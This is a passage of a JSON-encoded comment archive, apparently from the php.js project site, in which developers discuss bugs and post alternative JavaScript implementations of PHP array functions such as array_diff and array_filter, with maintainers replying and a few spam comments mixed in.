will always work properly, \nsince keycount does not have to be falsy 0, but REALLY zero.\n\n    if (keycount !== values.length) {\n        return false;\n    }\n\n[\/CODE]\n"}],"array_count_values":[{"date":"2008-05-06 13:38:09","author":"vikas","url":"","comment":"it very nice"},{"date":"2008-08-25 09:42:32","author":"sankai","url":"","comment":"It can't work well in IE!\r\nThe debug infomation is &quot;Object don't support the attribute or method&quot; in the code as\r\n[CODE=&quot;Javascript&quot;]\r\n    if (array instanceof Array) {\r\n        array.forEach(countValue, tmp_ar);\r\n    } else if (array instanceof Object) {\r\n        for ( key in array ) {\r\n            countValue.call(tmp_ar, array[key]);\r\n        }\r\n    }\r\n[\/CODE]\r\n\r\n\u00e5\u203a\u00a7rz..but,It's working very well in Firefox!!"},{"date":"2008-08-25 11:59:27","author":"sankai","url":"","comment":"It seems because IE broswer don't support the mothod array.forEach().I search some solution from the google web.\r\n\r\nhttp:\/\/developer.mozilla.org\/En\/Core_JavaScript_1.5_Reference:Global_Objects:Array:forEach\r\n\r\nI try add the code before array_count_values()\r\n[CODE=&quot;Javascript&quot;]\r\nif (!Array.prototype.forEach)\r\n{\r\n  Array.prototype.forEach = function(fun \/*, thisp*\/)\r\n  {\r\n    var len = this.length;\r\n    if (typeof fun != &quot;function&quot;)\r\n      throw new TypeError();\r\n\r\n    var thisp = arguments[1];\r\n    for (var i = 0; i &lt; len; i++)\r\n    {\r\n      if (i in this)\r\n        fun.call(thisp, this[i], i, this);\r\n    }\r\n  };\r\n}\r\n[\/CODE]\r\n\r\nlol...It still can't work!!!\r\n\r\nOrz..do you have any idea,sir?"},{"date":"2008-08-27 19:26:37","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ sankai: Thanks for pointing that out sankai! I've replaced the mozilla-only: forEach with a regular for loop. It should work fine now!"},{"date":"2009-03-25 01:39:57","author":"J-R","url":"none","comment":"Hi, \nI am on firefox on a mac. This code doesn't seem to be working. I tried debugging it by putting alerts in the function. It looks ok except it doesn't return what I expect it to. I am using your example to try to produce the same result to no avail. \n[code]\n<script type='text\/javascript'>\n\nfunction array_count_values( array ) {\n    \/\/ http:\/\/kevin.vanzonneveld.net\n    \/\/ +   original by: Ates Goral (http:\/\/magnetiq.com)\n    \/\/ + namespaced by: Michael White (http:\/\/getsprink.com)\n    \/\/ +      input by: sankai\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ *     example 1: array_count_values([ 3, 5, 3, \"foo\", \"bar\", \"foo\" ]);\n    \/\/ *     returns 1: {3:2, 5:1, \"foo\":2, \"bar\":1}\n    \/\/ *     example 2: array_count_values({ p1: 3, p2: 5, p3: 3, p4: \"foo\", p5: \"bar\", p6: \"foo\" });\n    \/\/ *     returns 2: {3:2, 5:1, \"foo\":2, \"bar\":1}\n    \/\/ *     example 3: array_count_values([ true, 4.2, 42, \"fubar\" ]);\n    \/\/ *     returns 3: {42:1, \"fubar\":1}\n \n    var tmp_arr = {}, key = '', t = '';\n    \n    var __getType = function(obj) {\n        \/\/ Objects are php associative arrays.\n        var t = typeof obj;\n        t = t.toLowerCase();\n        if (t == \"object\") {\n            t = \"array\";\n        }\n        return t;\n    }    \n \n    var __countValue = function (value) {\n        switch (typeof(value)) {\n            case \"number\":\n                if (Math.floor(value) != value) {\n                    return;\n                }\n            case \"string\":\n                if (value in this) {\n                    ++this[value];\n                } else {\n                    this[value] = 1;\n                }\n        }\n    };\n    \n    t = __getType(array);\n    if (t == 'array') {\n        for ( key in array ) {\n            __countValue.call(tmp_arr, array[key]);\n        }\n    } \n    return tmp_arr;\n}\n\n\nfunction formValidator(){\n\tvar tmpArray= [];\n\ttmpArray = array_count_values([ 3, 5, 3, \"foo\", \"bar\", \"foo\" ]);\n\tdocument.write(tmpArray[0]  + tmpArray[1]+ tmpArray[2]);\n\tdocument.write(tmpArray[3]  + tmpArray[4]+ tmpArray[5]);\n\/\/\tdocument.write(tmpArray[0] + \" \" + tmpArray[1]+ \" \" + tmpArray[2] + \" \" + tmpArray[3]+ \" \" + tmpArray[4]+ \" \" + tmpArray[5]);\n}\n\n<\/script>\n\n<form id=\"frmchoixronde1\" name=\"frmchoixronde1\"  method=\"POST\" \nenctype=\"application\/x-www-form-urlencoded\" onsubmit='return formValidator()'>\n<html><head><title>Page des poolers<\/title><\/head> <body>\n<b>Entrez vos choix pour la premiere ronde<\/b>\n<\/br><fieldset>\n\n<b><label for=\"player_1\" style=\"width:2em\">1<\/label><\/b><input name=\"player_1\" id=\"player_1\" type=\"text\" size=\"30\"><\/br>\n<b><label for=\"player_2\" style=\"width:2em\">2<\/label><\/b><input name=\"player_2\" id=\"player_2\" type=\"text\" size=\"30\"><\/br>\n<b><label for=\"player_3\" style=\"width:2em\">3<\/label><\/b><input name=\"player_3\" id=\"player_3\" type=\"text\" size=\"30\"><\/br>\n\n<b><label for=\"player_4\" style=\"width:2em\">4<\/label><\/b><input name=\"player_4\" id=\"player_4\" type=\"text\" size=\"30\"><\/br>\n<b><label for=\"player_5\" style=\"width:2em\">5<\/label><\/b><input name=\"player_5\" id=\"player_5\" type=\"text\" size=\"30\"><\/br>\n<b><label for=\"player_6\" style=\"width:2em\">6<\/label><\/b><input name=\"player_6\" id=\"player_6\" type=\"text\" size=\"30\"><\/br>\n<input type=\"submit\" name=\"submit\" value=\"Soumettre vos choix\">\n\n<\/form>\n<\/br> \n<\/body><\/html> \n\n[\/code]"},{"date":"2009-04-03 12:36:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ J-R: I'm running the test code with no problems:\n$ .\/phpjstest.php array_count_values\narray\/array_count_values.js              returns#1    OKAY \n                                         returns#2    OKAY \n                                         returns#3    OKAY \n\nCould you provide the exact code that fails? What did you expect, and what did it return instead? That would help us fix the problem! Thx"},{"date":"2010-04-21 17:29:43","author":"Shingo","url":"","comment":"Thanks but there is one problem. If my test array is like\n[code]\n  arr=[\"constructor\"];\n[code]\nIt does not work."},{"date":"2010-04-22 18:54:39","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Shingo: Thanks for the report! Fixed in Git (with some other clean-up): http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/array\/array_count_values.js"}],"array_diff":[{"date":"2008-01-22 05:37:46","author":"Ates Goral","url":"","comment":"Here's array_diff_key():\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_diff_key(object) {\r\n    \/\/ *     example 1: array_diff_key({red: 1, green: 2, blue: 3, white: 4});\r\n    \/\/ *     returns 1: {&quot;red&quot;:1, &quot;green&quot;:2, &quot;blue&quot;:3, &quot;white&quot;:4}\r\n    \/\/ *     example 2: array_diff_key({red: 1, green: 2, blue: 3, white: 4}, {red: 5});\r\n    \/\/ *     returns 2: {&quot;green&quot;:2, &quot;blue&quot;:3, &quot;white&quot;:4}\r\n    \/\/ *     example 3: array_diff_key({red: 1, green: 2, blue: 3, white: 4}, {red: 5}, {green: 6, blue: 7});\r\n    \/\/ *     returns 3: {&quot;white&quot;:4}\r\n    \/\/ *     example 4: array_diff_key({red: 1, green: 2, blue: 3, white: 4}, {red: 5}, {red: 5});\r\n    \/\/ *     returns 4: {&quot;green&quot;:2, &quot;blue&quot;:3, &quot;white&quot;:4}\r\n    \r\n    var ret = new Object();\r\n    \r\n    for (var key in object) {\r\n        ret[key] = object[key];\r\n    }\r\n    \r\n    for (var argidx = 1; argidx &lt; arguments.length; ++argidx) {\r\n        var other = arguments[argidx];\r\n        \r\n        if (other instanceof Object) {\r\n            for (var key in other) {\r\n                delete ret[key];    \r\n            }\r\n        }\r\n    }\r\n    \r\n    return ret;\r\n}\r\n[\/CODE]"},{"date":"2008-01-22 09:00:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: All together superb contributions. Greatly formatted and very consistent. I also like that you've included the example-return pairs in the comments. Thanks a LOT!"},{"date":"2008-03-13 03:50:23","author":"Re-Ordering the Index","url":"","comment":"\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\n\/*\r\nSanjoy Roy's comments:\r\n------------------------------- \r\nI have added a counter variable (cntr) and return array returns ordered array.\r\nThis will help to get rid of 'undefined' values in the list when we use them in our program.\r\n*\/\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_diff (array) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ *     example 1: array_diff(['Kevin', 'van', 'Zonneveld'], ['van', 'Zonneveld']);\r\n    \/\/ *     returns 1: ['Kevin']\r\n \r\n    var arr_dif = [], i = 1, argc = arguments.length, argv = arguments, key, key_c, found=false, cntr=0;\r\n \r\n    \/\/ loop through 1st array\r\n    for ( key in array ){\r\n        \/\/ loop over other arrays\r\n        for (i = 1; i&lt; argc; i++){\r\n            \/\/ find in the compare array\r\n            found = false;\r\n            for (key_c in argv[i]) {\r\n                if (argv[i][key_c] == array[key]) {\r\n                    found = true;\r\n                    break;\r\n                }\r\n            }\r\n \r\n            if(!found){\r\n                \/\/arr_dif[key] = array[key];\r\n                arr_dif[cntr] = array[key];\r\n                cntr++;\r\n            }\r\n        }\r\n    }\r\n \r\n    return arr_dif;\r\n};\r\n[\/CODE]"},{"date":"2008-03-13 15:51:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Sanjoy Roy: Thank you, added!"},{"date":"2009-10-08 10:35:49","author":"Itsacon","url":"http:\/\/www.itsacon.net\/","comment":"There's a compatibility problem with this function and functions that take Array inputs (and check for it), like implode().\r\nThis is caused by this line:\r\n[code]var arr1 = arguments[0], retArr = {};[\/code]\r\nThe retArr variable gets instantiated as a generic Object, not an Array. Because of this, the return value for this function is not an Array.\r\n\r\nI changed this line to \r\n[code]var arr1 = arguments[0], retArr = new Array;[\/code]\r\nThis solved my problems.\r\n\r\n(Note that this also applies to several other array_ functions that (should) return Arrays)"},{"date":"2009-10-09 05:06:36","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Itsacon: We are really kind of forced in most cases to treat arrays as objects in order to preserve PHP-like behavior of preserving keys (such as array_diff), including numeric keys. For example, to take Example #1 at http:\/\/php.net\/array_diff , note that the key returned is '1' (with the value 'blue'). To do this with a regular array, we would either need to force the array to be of size 2, i.e.: \"[undefined, 'blue']\" or lose the key=1 information, i.e., \"['blue']\".\n\nI also see that I hadn't updated our array_diff example to show an object being returned, so it was showing an array being returned instead, but that is now fixed in Git.\n\nIf you really want to be able to return genuine arrays and don't mind losing key information (or don't mind getting an array which has \"undefined\" place-holders for empty numeric keys causing the size of the array to be inflated), then we could add some code to allow you to do something like:\n\n[CODE]ini_set('phpjs.objectsAsArrays', 0);[\/CODE]\n\n...to indicate you want array inputs to be returned as arrays. But again, there are disadvantages to this, and we'd have to choose one of the two approaches (undefined items or no key information).\n\n@Kevin: If you ever decide to add a FAQ, I think this should be the #1 Question! :)"},{"date":"2009-10-09 12:14:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: We could probably start one in the wiki.\nWhat do you think about hosting the wiki here:\nhttp:\/\/wiki.github.com\/kvz\/phpjs ?\n\nthis way i wouldn't have to worry about updating media wiki, accountmanagement, and backups ?"},{"date":"2009-10-09 12:47:34","author":"Itsacon","url":"http:\/\/www.itsacon.net\/","comment":"I understand, and have by now run into the problem myself (array_diff with un-indexed arrays gives forced numeric indexes to the resulting array). \r\nIf you choose to use generic Objects for arrays throughout, the implode() function should reflect this as well.\r\n\r\nI'll append a comment there."},{"date":"2009-10-18 18:25:42","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kevin: I guess using the GitHub wiki would be ok, but it really gets under my skin when these sites, instead of using the powerful and well-known Mediawiki, add frustratingly deficient wikis of their own (and I'm already unhappy with Git itself, or rather, the current lack of GUI tools to work with it as well as with Subversion). But to be fair to you (and it is not a big deal for the limited documentation we need), the GitHub wiki should work fine for this."},{"date":"2009-10-18 18:29:08","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kevin: Also, by the way, do you know why phpjs.org hangs seemingly indefinitely after posting a comment here? I seem to always have to refresh the page... (there are also some red warnings displayed in the interim)"},{"date":"2009-10-25 13:24:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Thanks for baring with me Brett. I must say I'll sleep a little bit better knowing there's 1 less thing I need to maintain & think of.\nI'll add a link to the github wiki and we'll see how it goes OK?"},{"date":"2009-10-25 13:25:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: The comments, no I'm not having those issues. Could you by any chance supply the errors?\n\nbtw I removed the social javascript. maybe that fixes some issues as well."},{"date":"2009-10-26 00:50:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"It seems the comments problem is fixed now. And, sure, go ahead and add a link to the wiki; that'd be great..."},{"date":"2009-11-07 18:29:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Link is on it's way!"},{"date":"2009-11-08 03:49:09","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kevin: Now that we actually have a FAQ on the wiki (at least the beginnings of one), do you want to link directly to that instead of the wiki? (or maybe call it \"FAQ\/wiki\" to indicate that both are available there) I think it's important to indicate that we have FAQ answered there. Also, what do you think of making automated links on the function pages to the wiki for letting users contribute their own non-PHP variations, tips on use, etc.?"},{"date":"2009-11-08 03:50:02","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kevin: also, btw, thanks for adding the link!"},{"date":"2009-11-08 16:40:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Yes we have a FAQ! : ) Let's just take a moment to enjoy that fact :D\n\nOk, good.\n\nI've changed the navigation a bit according to your ideas.\n\nAs far as linking\/making wiki pages for individual functions; I'm not too fond of that idea as there already is a lot of information about functions in the comments, and I think I'd like to keep it centralized that way.\n\nAnd we can't move all function comments to the wiki cause that would probably raise the bar for people to leave any comment at all."},{"date":"2010-11-16 02:33:08","author":"CoR","url":"","comment":"You have pretty nasty bug in code. JavaScript doesn't have real array. Length isn't real number of array items!\n .length = lastIndex + 1;\n\nConsider this:\n[code]\nvar ar = [0,1,2];\nconsole.log(ar.length);\t\/\/ 3, and that's ok\nar[900] = 3;\nconsole.log(ar.length);\t\/\/ 901 and that's horribly wrong!\n[\/code]\nWith ar[900] I just created array of 901 elements. First three are 0,1,2. Last element is 3. And in the middle I have 897 undefined elements. Pretty bad...\n\n\nFix:\nvar retArr = {};  \/\/ not good\nvar retArr = [];   \/\/ good\n\nretArr[k1] = arr1[k1];  \/\/ bug\nretArr.push(arr1[k1]);\n\n\n"},{"date":"2010-11-16 04:39:09","author":"CoR","url":"","comment":"[code]\nvar ar1 =[0,1,2,3,4];\nvar ar2 =[0,1,2];\nvar a = array_diff(ar1,ar2);\nconsole.log(a.length);\t\/\/ 5\n[\/code]\n\n\np.s. a.length will fail because of var retArr = {};\nAfter [] fix it will produce seemingly false .length of 5.\n\na === [undefined, undefined, undefined,3,4];"},{"date":"2010-11-17 12:23:11","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@CoR: Please see item 1 of the FAQ: http:\/\/wiki.github.com\/kvz\/phpjs\/faq . The PHP way is to preserve keys which as you suggest is problematic with regular arrays (not to mention non-numeric keys)."},{"date":"2010-11-18 00:19:52","author":"CoR","url":"","comment":"@Brett Zamir:\nYes, I see what you mean... I was too fast to point array problem without reading faq. My bad ;)\n\nAnyway, in my case array_diff should work only with JS arrays and it MUST return fully functional JS array.\n[] and .push() works great :)\n\nAnother 'solution' is making array_diffo that will use json objects as key:value array. But it's poor substitute for PHP's associative arrays. No length, no indexing...\n\nIt's nice that this site exist. You have tons of useful code!"},{"date":"2011-06-13 12:14:55","author":"George Wilde","url":"","comment":"Hey,\nThanks for the code it worked perfectly as described :)\n\nI thought I would post my adaptation returning an array instead of an object. In doing this you sacrifice the original array keys but it suited my needs.\n\n[CODE]\nfunction array_diff (arr1) {\n    \/\/ http:\/\/kevin.vanzonneveld.net\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +   improved by: Sanjoy Roy\n    \/\/ +    revised by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ *     example 1: array_diff(['Kevin', 'van', 'Zonneveld'], ['van', 'Zonneveld']);\n    \/\/ *     returns 1: [0 => 'Kevin']\n    var retArr = [],\n        argl = arguments.length,\n        k1 = '',\n        i = 1,\n        k = '',\n        arr = {};\n\n    arr1keys: for (k1 in arr1) {\n        for (i = 1; i < argl; i++) {\n            arr = arguments[i];\n            for (k in arr) {\n                if (arr[k] === arr1[k1]) {\n                    \/\/ If it reaches here, it was found in at least one array, so try next value\n                    continue arr1keys;\n                }\n            }\n            retArr.push(arr1[k1]);\n        }\n    }\n\n    return retArr;\n}\n[\/CODE]"},{"date":"2011-06-13 19:23:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@George Wilde: Great, thanks for sharing!"},{"date":"2012-01-25 16:19:26","author":"Vasil Vasilev","url":"vaseto.eu","comment":"Here is another implementation of the array_diff I am using in a project. I prefer to use for (;;) arrays to make sure I am iterating only over values, and will skip prototyped array members etc. \n[CODE]\n var array_diff = function(arr1) {\n      var retArr = [],\n          arr1length, i, j, z, keyFound,\n          argl = arguments.length, arr = [];\n      pArr:\n        for (i = 0, arr1length = arr1.length; i < arr1length; i++) {\n        keyFound = false;\n        for (j = 1; j < argl; j++) {\n          arr = arguments[j];\n          for (var z = 0, arrLength = arr.length; z < arrLength; z++) {\n            if (arr[z] === arr1[i]) {\n              keyFound = true;\n              continue pArr;\n            }\n          }\n          if (keyFound) {\n            continue;\n          }\n        }\n        if ( ! keyFound) {\n          retArr.push(arr1[i]);\n        }\n      }\n      return retArr;\n    };\n[\/CODE]"},{"date":"2012-04-23 14:48:15","author":" ????? ????? ????","url":"http:\/\/an3m1.com\/","comment":"This is a very informative article. I was looking for these things and here I found it. I am doing a project and this information is very useful me. Some things in here I have not thought about before\n \n"},{"date":"2012-05-15 23:55:04","author":"vinyl ","url":"http:\/\/alsidewindowsz.com","comment":"I love using syntax its such a great system. I love learning new code it expands my brain capacity by 30%. "}],"array_diff_assoc":[{"date":"2008-11-28 10:00:52","author":"-=0m3r=-","url":"","comment":"hi \r\nyour array_diff_assoc not correct \r\n-- if(argv[i][key]){ \r\n++ if(argv[i][key] &amp;&amp; argv[i][key] == array[key]){"},{"date":"2008-12-01 08:49:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ 0m3r: Thanks you!"},{"date":"2012-05-06 09:41:01","author":"???? ????????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"array_diff_key":[{"date":"2008-01-22 17:46:51","author":"Ates Goral","url":"","comment":"Hi Kevin,\r\n\r\nSince all the variables are now being declared in this line:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar tpm_ar = new Object(), argc = arguments.length, argv = arguments, key, other;\r\n[\/CODE]\r\n\r\nThe var statements that follow can be removed."},{"date":"2008-01-22 21:01:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Overlooked it, thanks."},{"date":"2011-06-12 15:59:25","author":"Everlasto","url":"","comment":"arr1keys: for (k1 in arr1) {\nvar j=arguments.length;\n      for (i = 1; i < j; i++) {...}\n\nA small suggestion :)\n"},{"date":"2011-06-13 06:14:42","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Everlasto: Added in Git with a little clean-up; thanks for the report!"},{"date":"2012-04-17 15:32:45","author":"????? ???????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"array_diff_uassoc":[{"date":"2009-03-11 06:53:11","author":"yoh","url":"","comment":"cool... thanks for sharing"},{"date":"2012-04-17 15:32:14","author":"???? ????","url":"http:\/\/an3m1.com\/","comment":"Write more, that\u2019s all I have to say. Literally, it seems as though you relied on the video to make your point. You clearly know what you\u2019re talking about, why waste your intelligence on just posting videos to your blog when you could be giving us something enlightening to read \n"}],"array_fill":[{"date":"2008-01-29 17:31:35","author":"waldo malqui silva aka _argos","url":"","comment":"Hi Kevin.\r\n\r\nI have some ports to your project, and I wanna know if you change my real name by _argos, sorry for duplicate one function ( array_fill ) and make one function (array_pad) on that you are working : \r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar Test1 = 4.2;\r\n\r\nvar Test2 = -4.2;\r\n\r\nvar Test3 = 5;\r\n\r\nvar Test4 = -5;\r\n\r\nvar Test5 = 'prueba';\r\n\r\nconsole.log ( abs ( Test1 ) );\r\n\r\nconsole.log ( abs ( Test2 ) );\r\n\r\nconsole.log ( abs ( Test3 ) );\r\n\r\nconsole.log ( abs ( Test4 ) );\r\n\r\nconsole.log ( abs ( Test5 ) );\r\n\r\n\r\nfunction abs ( mixed_number )  {\r\n\r\n  return ( ( !isNaN ( mixed_number ) ) ? ( ( mixed_number &lt; 0 ) ? ( mixed_number * -1 ) : mixed_number ) : 0 );\r\n\r\n}\r\n\r\n\t\r\n\r\nvar TestA = [ 7,8,9 ];\r\n\r\n    \r\n\r\nconsole.log ( array_pad ( TestA, 2, 'a' ) );\r\n\r\nconsole.log ( array_pad ( TestA, 5, 'a' ) );\r\n\r\nconsole.log ( array_pad ( TestA, 5, 2 ) );\r\n\r\nconsole.log ( array_pad ( TestA, -5, 'a' ) );\r\n\r\nconsole.log ( array_pad ( TestA, -5, 2 ) );\r\n\r\n\t\r\n\r\nfunction array_pad ( input, pad_size, pad_value ) {\r\n\r\n  var pad = [];\t\t\r\n\r\n  if ( input instanceof Array &amp;&amp; !isNaN ( pad_size ) ) {\r\n    var newArray = [];\r\n    var newLength = ( ( pad_size &lt; 0 ) ? ( pad_size * -1 ) : pad_size );\r\n\r\n    if ( newLength &gt; input.length ) {\r\n      for ( var i = 0; i &lt; ( newLength - input.length ); i++ ) { newArray [ i ] = pad_value; }\r\n\r\n      pad = ( ( pad_size &lt; 0 ) ? newArray.concat ( input ) : input.concat ( newArray ) );\r\n\r\n    } else {\r\n\r\n      pad = input;\r\n\r\n    }\r\n\r\n  }\r\n\r\n  return pad;\r\n\r\n}\r\n\r\n\t\r\n\r\nfunction array_fill ( start_key, num, val ) {\r\n\r\n  var fill = [];\r\n\r\n\r\n\r\n  if ( !isNaN ( start_key ) &amp;&amp; !isNaN ( num ) ) {\r\n\r\n    for ( var i = start_key; i &lt; (start_key + num ); i++ ) {\r\n\r\n      fill [ i ] = val;\r\n\r\n    }\r\n\r\n  }\r\n\r\n\t\t\r\n\r\n  return fill;\r\n\r\n}\r\n\r\n        \r\n\r\nconsole.log ( strlen ( 'alexa' ) );\r\n\r\n\r\nfunction strlen  ( str ) {\r\n\r\n  return str.length;\r\n\r\n}\r\n\r\n     \r\n\r\nconsole.log ( implode ( '-', [1,2,3,4,5,6,7,8,9,0] ) );\r\n\r\n\r\n\r\nfunction implode ( glue, pieces ) {\r\n\r\n  return ( ( pieces instanceof Array ) ? pieces.join ( glue ) : pieces );      \r\n\r\n}\r\n[\/CODE]"},{"date":"2008-01-29 20:48:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ _argos: Hey argos, Thanks for your input, I've added everything to the project. If you know any more, feel free to leave another comment any time :)"},{"date":"2008-11-16 10:04:07","author":"Brett Zamir","url":"","comment":"Here's one for array_fill_keys() with a sample based on the PHP manual page for array_fill_keys():\r\n\r\n$keys = ['foo', 5, 10, 'bar'];\r\n$a = array_fill_keys($keys, 'banana');\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_fill_keys (keys, value) {\r\n    for (var i=0, retObj={}; i &lt; keys.length; i++) {\r\n            retObj[keys[i]] = value;\r\n    }\r\n    return retObj;\r\n}[\/CODE]"},{"date":"2008-11-18 12:22:10","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Cool, I've committed it. Will be online shortly. Are you sure by the way, that PHP does not allow associative arrays as 'keys'? Otherwise we will have to change the for-loop to support this."},{"date":"2008-11-21 00:03:51","author":"Brett Zamir","url":"","comment":"Yeah, you were right, sorry. Here it is to accept associative as well as regular arrays for 'keys':\r\n\r\nExamples:\r\n[CODE=&quot;Javascript&quot;]$keys = {'a':'foo', 2:5, 3:10, 4:'bar'};\r\n\/\/$keys = ['foo', 5, 10, 'bar'];[\/CODE]\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]function array_fill_keys (keys, value) {\r\n    var retObj={};\r\n    for (var key in keys) {\r\n            retObj[keys[key]] = value;\r\n    }\r\n    return retObj;\r\n}[\/CODE]\r\n\r\nSorry for the trouble..."},{"date":"2008-11-25 17:15:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Cool, thx!"},{"date":"2012-03-22 13:51:31","author":"??????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"Anyone looking for what\u2019s new, visit the gate Yes "},{"date":"2012-07-10 09:08:25","author":"Friv","url":"http:\/\/www.friv.name","comment":"Cool code.\nMany thanks!"},{"date":"2012-09-28 15:38:33","author":"Friv games","url":"http:\/\/www.friv.mn","comment":"I want to thank you for clearing this issue. I looked everywhere. "}],"array_filter":[{"date":"2009-08-17 02:59:10","author":"J.","url":"","comment":"php handles both array and object, unfortunately JS does not distinguish indexed array and hashed array object...\n\narray_filter in php handles both types and returns type intacted..  Can we add type check like below?\n\n[code]\narray_filter: function  (arr, func) {\n\t    var retObj, k, type = 'array';\n\t    func_set = 0;\n\t    \n\t    if(this.isset(func))\n\t    \tfunc_set = 1;\n\t    \/\/ Check for 'length'\n\t    if(arr.length === undefined){\n\t    \ttype = 'hashed_array';\n\t    }\n\t    if(type == 'hashed_array'){\n\t    \tretObj = {};\n\t\t    for (k in arr) {\n\t\t    \tif(func_set){\n\t\t\t        if (func(arr[k])) {\n\t\t\t            retObj[k] = arr[k];\n\t\t\t        }\n\t\t    \t}else{\n\t\t    \t\tif(this.is_null(arr[k]))\n\t\t    \t\t\tcontinue;\n\t\t    \t\tretObj[k] = arr[k];\n\t\t    \t}\n\t\t    }\n\t    }else{\n\t    \tretObj = [];\n\t    \tfor(i=0;i<arr.length;++i){\n\t    \t\tif(func_set){\n\t\t\t        if (func(arr[i])) {\n\t\t\t            retObj[i] = arr[i];\n\t\t\t        }\n\t\t    \t}else{\n\t\t    \t\tif(this.is_null(arr[i]))\n\t\t    \t\t\tcontinue;\n\t\t    \t\tretObj[i] = arr[i];\n\t\t    \t}\n\t    \t}\n\t    }\n\t    \n\t    return retObj;\n\t}\n[\/code]"},{"date":"2009-08-17 04:42:18","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@J.: While I know it's definitely tempting to try it that way, a problem arises when the preserved filtered results are not all sequential at the beginning of the array (probably most times); the keys will either end up not being preserved (as they are in PHP), or, as in your code, we'd end up making an array with \"undefined\" values throughout in place of missing values and which showed a size equal to the original array instead of the length of filter-positive values (as most people would probably want it). \n\nIn a number of functions we really have to return an array, though there may be a few which could be adapted to try to return a genuine array where possible. But as far as array_filter, the cases where this would be valid (positive results all sequential at the beginning) would be uncommon, and probably confusing if we didn't follow a uniform policy (unless, again, the results would be consistent)."},{"date":"2009-08-17 04:43:35","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Sorry, I meant, \"we really have to return an object\""},{"date":"2009-08-18 07:59:14","author":"J","url":"","comment":"Oops, I meant to put retObj.length  to omit the null ones..\nNot sure if that makes any diff..\n\n[code]\nif(!this.is_null(arr[i])){\n\tretObj[retObj.length] = arr[i];\n}\n[\/code]"},{"date":"2009-08-18 12:04:48","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@J: Sorry, no difference. If you set a key on a JS array, it will fill in the gaps with 'undefined'. \n\nTry this with our function:\n\nvar arr = array_filter2([3, 4, 5, 6], function (n) {return n >= 5;});\nalert(arr.length); \/\/ Should be 2, but is 4\n\nYours gives four, while ours doesn't pretend to be an array (there's no length at all), so it is not confusing.\n"},{"date":"2009-08-18 12:11:28","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Of course that's a typo with array_filter2 (which should just be array_filter)"},{"date":"2011-10-07 12:57:49","author":"max4ever","url":"","comment":"usually in php array_filter($array), filters empty values(like '', 0, false ...) "},{"date":"2011-10-08 00:12:22","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@max4ever: The latest version in Git now adds support for a single-argument-only call. Thanks!"},{"date":"2012-02-22 18:54:39","author":"Tim Younger","url":"bustedtubes.com","comment":"might want to return an array if param was an array. i'm sure there is a more secure way to evaluate if the param was an array, but is_array is overkill for native support.\n\n[CODE]\nif 